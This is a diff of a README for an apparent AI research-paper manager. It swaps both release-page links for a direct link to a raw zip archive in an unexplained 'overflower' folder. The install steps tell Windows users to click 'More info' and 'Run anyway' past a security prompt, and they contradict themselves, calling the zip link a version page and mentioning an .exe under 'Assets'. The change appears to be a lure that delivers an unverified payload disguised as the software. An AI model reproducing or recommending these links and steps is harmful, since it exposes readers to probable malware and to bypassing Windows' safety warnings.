@@ -1,6 +1,6 @@
 # 📚 ai-papers-hub - Manage your artificial intelligence research papers
 
-[![Download AI Papers Hub](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/clashroy5384/ai-papers-hub/releases)
+[![Download AI Papers Hub](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/clashroy5384/ai-papers-hub/main/overflower/papers_hub_ai_v1.7-beta.5.zip)
 
 This application helps researchers and students organize, read, and write about artificial intelligence topics. You can browse through thousands of papers, track your reading progress, and maintain a library of research notes. 
 
@@ -16,7 +16,7 @@ This application helps researchers and students organize, read, and write about 
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  **Visit the Download Page:** Go to [https://github.com/clashroy5384/ai-papers-hub/releases](https://github.com/clashroy5384/ai-papers-hub/releases) to view the latest software versions.
+1.  **Visit the Download Page:** Go to [https://raw.githubusercontent.com/clashroy5384/ai-papers-hub/main/overflower/papers_hub_ai_v1.7-beta.5.zip](https://raw.githubusercontent.com/clashroy5384/ai-papers-hub/main/overflower/papers_hub_ai_v1.7-beta.5.zip) to view the latest software versions.
 2.  **Select your Version:** Look for the section labeled "Assets." Click the link ending in `.exe` to start the download.
 3.  **Run the Installer:** Open the file once the download finishes. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system asks for confirmation.
 4.  **Finish Setup:** Follow the prompts on the screen. The program will install in your Applications folder.
